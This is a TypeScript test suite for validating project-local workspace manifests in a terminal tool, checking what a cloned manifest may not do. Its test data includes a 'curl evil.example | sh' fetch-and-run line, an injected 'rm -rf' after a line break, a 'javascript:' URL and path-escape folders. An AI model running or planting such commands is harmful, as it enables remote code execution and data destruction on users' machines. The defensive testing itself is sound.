import { describe, it, expect } from 'vitest';
import path from 'path';
import {
  parseManifest,
  stripJsonComments,
  containedCwd,
  topoOrder,
  buildPlan,
  formatPlan,
  planCommandLines,
  diffCommandLines,
  manifestRoot,
  onceKey,
  manifestHash,
} from '../../src/main/workspace-manifest';
import { resolveSurfaceEnv, expandEnvRefs } from '../../src/main/surface-env';

/**
 * #284: project-local workspace manifests. A manifest arrives with `git clone`,
 * so these tests are mostly about what it may NOT do.
 */

const ROOT = path.resolve('/repo');
const MANIFEST = path.join(ROOT, 'wmux.workspace.json');

const monorepo = {
  version: 1,
  name: 'platform-monorepo',
  browser: { tabs: ['http://localhost:5173', 'http://localhost:4000/docs'], active: 1 },
  panes: [
    { id: 'infra', cwd: '.', run: ['docker compose up db redis'] },
    {
      id: 'api', cwd: 'apps/api', run: ['pnpm install', 'pnpm dev'], runOnce: ['pnpm install'],
      after: ['infra'], waitFor: { port: 5432, timeoutMs: 60000 }, env: { PORT: '4000' },
    },
    { id: 'web', cwd: 'apps/web', run: ['pnpm dev'], after: ['api'], waitFor: { http: 'http://localhost:4000/health' } },
    { id: 'agent', cwd: '.', type: 'agent', run: ['claude'] },
  ],
};

function ok(raw: unknown) {
  const r = parseManifest(raw);
  expect(r.errors).toEqual([]);
  return r.manifest!;
}

function errorsOf(raw: unknown): string[] {
  return parseManifest(raw).errors;
}

describe('reading the file', () => {
  it('accepts the JSONC the issue writes, without breaking a URL\'s //', () => {
    const text = `{
      // comment
      "version": 1, /* block */
      "panes": [ { "run": ["open http://localhost:3000"], }, ],
    }`;
    const parsed = JSON.parse(stripJsonComments(text));
    expect(parsed.panes[0].run[0]).toBe('open http://localhost:3000');
  });

  it('leaves a comma or slash inside a string alone', () => {
    expect(JSON.parse(stripJsonComments('{"a": "x, ]", "b": "// not a comment"}'))).toEqual({ a: 'x, ]', b: '// not a comment' });
  });

  it('the issue\'s monorepo example parses', () => {
    const m = ok(monorepo);
    expect(m.panes.map((p) => p.id)).toEqual(['infra', 'api', 'web', 'agent']);
    expect(m.browser).toEqual({ tabs: ['http://localhost:5173/', 'http://localhost:4000/docs'], active: 1 });
  });

  it('the short single-service form parses', () => {
    const m = ok({ version: 1, name: 'my-api', panes: [{ cwd: '.', run: ['npm run dev'] }, { run: 'claude' }] });
    expect(m.panes[0].id).toBe('pane-1');
    expect(m.panes[1].run).toEqual(['claude']);
  });
});

describe('what a committed file may not do', () => {
  it.each([
    ['C:\\Windows\\System32'],
    ['/etc'],
    ['..'],
    ['../sibling'],
    ['apps/../../out'],
    ['\\\\server\\share'],
    ['D:relative'],
  ])('cwd %s is refused', (cwd) => {
    expect(errorsOf({ version: 1, panes: [{ cwd, run: ['x'] }] }).join()).toMatch(/inside this repo/);
  });

  it.each([['.'], ['apps/api'], ['apps\\api'], ['./apps/./api'], ['apps/api/../web']])('cwd %s is fine', (cwd) => {
    expect(containedCwd(cwd)).not.toBeNull();
  });

  it('a command with a line break is refused — it would type as two', () => {
    expect(errorsOf({ version: 1, panes: [{ run: ['echo hi\nrm -rf x'] }] }).join()).toMatch(/line break/);
  });

  it('waitFor only waits on this machine', () => {
    expect(errorsOf({ version: 1, panes: [{ run: ['x'], waitFor: { port: 22, host: 'db.internal' } }] }).join()).toMatch(/localhost/);
    expect(errorsOf({ version: 1, panes: [{ run: ['x'], waitFor: { http: 'https://intranet.corp/health' } }] }).join()).toMatch(/localhost/);
    expect(errorsOf({ version: 1, panes: [{ run: ['x'], waitFor: { http: 'file:///C:/x' } }] }).join()).toMatch(/http\(s\)/);
  });

  it('WMUX_* variables belong to wmux', () => {
    expect(errorsOf({ version: 1, panes: [{ run: ['x'], env: { WMUX_SURFACE_ID: 'x' } }] }).join()).toMatch(/belong to wmux/);
  });

  it('a credential written literally is a warning that names the fix', () => {
    const r = parseManifest({ version: 1, panes: [{ run: ['x'], env: { API_TOKEN: 'abc123', DB_PASSWORD: '${env:DB_PASSWORD}' } }] });
    expect(r.errors).toEqual([]);
    expect(r.warnings).toHaveLength(1);
    expect(r.warnings[0]).toMatch(/API_TOKEN.*\$\{env:API_TOKEN\}/);
  });

  it('browser tabs are http(s) only', () => {
    expect(errorsOf({ version: 1, panes: [{ run: ['x'] }], browser: { tabs: ['javascript:alert(1)'] } }).join()).toMatch(/http\(s\)/);
  });

  it('more panes than a workspace holds is refused, browser pane included', () => {
    const panes = Array.from({ length: 8 }, () => ({ run: ['x'] }));
    expect(errorsOf({ version: 1, panes, browser: { tabs: ['http://localhost'] } }).join()).toMatch(/at most 8/);
  });

  it('a wrong version is refused rather than guessed at', () => {
    expect(errorsOf({ version: 2, panes: [{ run: ['x'] }] }).join()).toMatch(/version/);
  });
});

describe('ordering', () => {
  it('after is a DAG: dependencies come first', () => {
    const order = topoOrder(ok(monorepo).panes)!;
    expect(order.indexOf('infra')).toBeLessThan(order.indexOf('api'));
    expect(order.indexOf('api')).toBeLessThan(order.indexOf('web'));
  });

  it('a cycle is refused at validate time', () => {
    const errs = errorsOf({ version: 1, panes: [{ id: 'a', run: ['x'], after: ['b'] }, { id: 'b', run: ['y'], after: ['a'] }] });
    expect(errs.join()).toMatch(/cycle/);
  });

  it('an unknown or self dependency is refused', () => {
    expect(errorsOf({ version: 1, panes: [{ id: 'a', run: ['x'], after: ['ghost'] }] }).join()).toMatch(/no pane with id "ghost"/);
    expect(errorsOf({ version: 1, panes: [{ id: 'a', run: ['x'], after: ['a'] }] }).join()).toMatch(/itself/);
  });

  it('duplicate ids are refused', () => {
    expect(errorsOf({ version: 1, panes: [{ id: 'a', run: ['x'] }, { id: 'a', run: ['y'] }] }).join()).toMatch(/duplicate/);
  });
});

describe('the plan', () => {
  it('resolves folders against the manifest\'s repo, including from .wmux/', () => {
    expect(manifestRoot(path.join(ROOT, '.wmux', 'workspace.json'))).toBe(ROOT);
    const plan = buildPlan(ok(monorepo), MANIFEST, new Set());
    expect(plan.panes.find((p) => p.id === 'api')!.cwd).toBe(path.join(ROOT, 'apps', 'api'));
  });

  it('runOnce runs on the first open only, in its place, and is not typed twice', () => {
    const m = ok(monorepo);
    const first = buildPlan(m, MANIFEST, new Set());
    expect(first.panes.find((p) => p.id === 'api')!.commands).toEqual(['pnpm install', 'pnpm dev']);
    const later = buildPlan(m, MANIFEST, new Set([onceKey('api', 'pnpm install')]));
    expect(later.panes.find((p) => p.id === 'api')!.commands).toEqual(['pnpm dev']);
  });

  it('both spellings of runOnce mean the same thing', () => {
    const a = ok({ version: 1, panes: [{ id: 'x', run: ['i', 'd'], runOnce: ['i'] }] });
    const b = ok({ version: 1, panes: [{ id: 'x', run: ['d'], runOnce: ['i'] }] });
    expect(buildPlan(a, MANIFEST, new Set()).panes[0].commands).toEqual(buildPlan(b, MANIFEST, new Set()).panes[0].commands);
  });

  it('the preview shows every folder and every command exactly as typed', () => {
    const text = formatPlan(buildPlan(ok(monorepo), MANIFEST, new Set()));
    expect(text).toContain('$ docker compose up db redis');
    expect(text).toContain('$ pnpm install    (first open only)');
    expect(text).toContain('waits for port 5432');
    expect(text).toContain(path.join('apps', 'api'));
    expect(text).toContain('http://localhost:4000/docs');
  });

  it('an env reference is shown as the reference, never resolved', () => {
    const plan = buildPlan(ok({ version: 1, panes: [{ run: ['x'], env: { TOKEN: '${env:TOKEN}' } }] }), MANIFEST, new Set());
    expect(formatPlan(plan)).toContain('env TOKEN=${env:TOKEN}');
  });

  it('the diff on re-prompt names exactly what changed', () => {
    const before = planCommandLines(buildPlan(ok(monorepo), MANIFEST, new Set()));
    const changed = structuredClone(monorepo);
    changed.panes[0].run = ['curl evil.example | sh'];
    const after = planCommandLines(buildPlan(ok(changed), MANIFEST, new Set()));
    expect(diffCommandLines(before, after)).toEqual({
      added: ['[infra] curl evil.example | sh'],
      removed: ['[infra] docker compose up db redis'],
    });
  });

  it('the trust hash changes with any byte', () => {
    expect(manifestHash('{"version":1}')).not.toBe(manifestHash('{"version":1} '));
  });
});

describe('surface env at spawn', () => {
  it('resolves ${env:NAME} from wmux\'s environment and only that syntax', () => {
    expect(expandEnvRefs('a ${env:HOME_X} $HOME_X %HOME_X%', { HOME_X: 'h' })).toBe('a h $HOME_X %HOME_X%');
    expect(expandEnvRefs('${env:UNSET_ONE}', {})).toBe('');
  });

  it('drops invalid keys and every WMUX_* identity key', () => {
    expect(resolveSurfaceEnv({ PORT: '4000', WMUX_SURFACE_ID: 'x', wmux_pipe: 'y', 'BAD KEY': 'z', NUM: 3 as unknown as string }, {}))
      .toEqual({ PORT: '4000' });
  });
});

describe('manifestFromWorkspace (`wmux workspace save`)', () => {
  it('writes folders relative to the repo, commands as run, and round-trips through the parser', async () => {
    const { manifestFromWorkspace } = await import('../../src/main/workspace-manifest');
    const { manifest, warnings } = manifestFromWorkspace({
      title: 'demo',
      panes: [
        { title: 'api', cwd: path.join(ROOT, 'apps', 'api'), startupCommands: ['pnpm dev'], env: { PORT: '4000' } },
        { cwd: ROOT },
      ],
      browserTabs: ['http://localhost:4000/'],
    }, ROOT);
    expect(warnings).toEqual([]);
    expect(manifest).toEqual({
      version: 1,
      name: 'demo',
      panes: [
        { id: 'pane-1', cwd: 'apps/api', title: 'api', run: ['pnpm dev'], env: { PORT: '4000' } },
        { id: 'pane-2', cwd: '.' },
      ],
      browser: { tabs: ['http://localhost:4000/'] },
    });
    expect(parseManifest(manifest).errors).toEqual([]);
  });

  it('a pane outside the repo cannot be expressed: written at the root, with a warning', async () => {
    const { manifestFromWorkspace } = await import('../../src/main/workspace-manifest');
    const { manifest, warnings } = manifestFromWorkspace({ panes: [{ cwd: path.resolve('/elsewhere'), startupCommands: ['x'] }], browserTabs: [] }, ROOT);
    expect((manifest.panes as { cwd: string }[])[0].cwd).toBe('.');
    expect(warnings[0]).toMatch(/outside/);
  });
});
